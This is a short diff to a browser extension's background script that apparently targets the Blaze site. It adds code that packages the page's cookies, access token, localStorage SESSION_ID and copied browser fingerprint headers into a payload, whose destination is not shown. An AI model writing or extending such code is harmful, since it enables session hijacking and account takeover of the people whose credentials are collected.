@@ -50,14 +50,23 @@ chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
         const cookieHeader = buildCookieHeader(cookies);
         const token = findToken(msg.data, cookies);
 
+        // 🔑 Extrair SESSION_ID do localStorage e headers do navegador
+        const sessionId = msg.data?.localStorage?.SESSION_ID || '';
+        
         const payload = {
           email: 'extension@blaze', // Email fixo para identificação
           source: 'extension',
           url: msg.data?.url,
           accessToken: token,
+          sessionId,
+          SESSION_ID: sessionId,
           cookies,
           cookieHeader,
-          userAgent: navigator.userAgent,
+          userAgent: msg.data?.userAgent || navigator.userAgent,
+          secChUa: msg.data?.secChUa || '',
+          secChUaMobile: msg.data?.secChUaMobile || '?0',
+          secChUaPlatform: msg.data?.secChUaPlatform || '""',
+          secGpc: '1',
           timestamp: Date.now()
         };
 
